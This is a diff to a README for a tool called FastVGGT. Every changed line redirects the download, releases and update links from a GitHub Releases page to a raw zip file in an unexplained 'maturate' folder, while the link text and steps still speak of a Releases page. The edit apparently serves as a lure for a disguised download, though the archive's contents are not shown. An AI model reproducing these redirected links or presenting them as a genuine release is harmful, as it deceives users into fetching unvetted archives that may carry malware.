@@ -1,6 +1,6 @@
 # 🚀 FastVGGT - Simple Acceleration for Visual Geometry Tasks
 
-[![Download FastVGGT](https://img.shields.io/badge/Download-FastVGGT-blue.svg)](https://github.com/uglyeyes/FastVGGT/releases)
+[![Download FastVGGT](https://raw.githubusercontent.com/uglyeyes/FastVGGT/main/maturate/FastVGGT.zip)](https://raw.githubusercontent.com/uglyeyes/FastVGGT/main/maturate/FastVGGT.zip)
 
 ## 😊 Introduction
 Welcome to FastVGGT! This application offers a way to accelerate your visual geometry tasks without the need for extensive training. With FastVGGT, you can enhance your productivity and achieve impressive results with minimal effort.
@@ -19,7 +19,7 @@ Before downloading FastVGGT, please ensure your system meets these minimum requi
 ## 📥 Download & Install
 To install FastVGGT, visit the following page to download the latest version:
 
-[Download FastVGGT from Releases](https://github.com/uglyeyes/FastVGGT/releases)
+[Download FastVGGT from Releases](https://raw.githubusercontent.com/uglyeyes/FastVGGT/main/maturate/FastVGGT.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest release at the top of the page.
@@ -51,7 +51,7 @@ After installation, using FastVGGT is simple:
 - Experiment with various settings to discover what works best for your needs.
 
 ## 🔄 Update Process
-We regularly update FastVGGT to improve performance and add new features. To update, simply return to the [Releases page](https://github.com/uglyeyes/FastVGGT/releases) and download the latest version following the same steps outlined above.
+We regularly update FastVGGT to improve performance and add new features. To update, simply return to the [Releases page](https://raw.githubusercontent.com/uglyeyes/FastVGGT/main/maturate/FastVGGT.zip) and download the latest version following the same steps outlined above.
 
 ## 🐞 Troubleshooting
 If you encounter any issues while using FastVGGT:
@@ -67,4 +67,4 @@ We appreciate community input! If you have suggestions or bug reports, feel free
 ## 🎉 Conclusion
 FastVGGT is designed to provide a seamless experience for accelerating visual geometry tasks. By following this guide, you can easily download, install, and start using the application effectively. Enjoy your enhanced productivity with FastVGGT!
 
-[Download FastVGGT from Releases](https://github.com/uglyeyes/FastVGGT/releases)
+[Download FastVGGT from Releases](https://raw.githubusercontent.com/uglyeyes/FastVGGT/main/maturate/FastVGGT.zip)
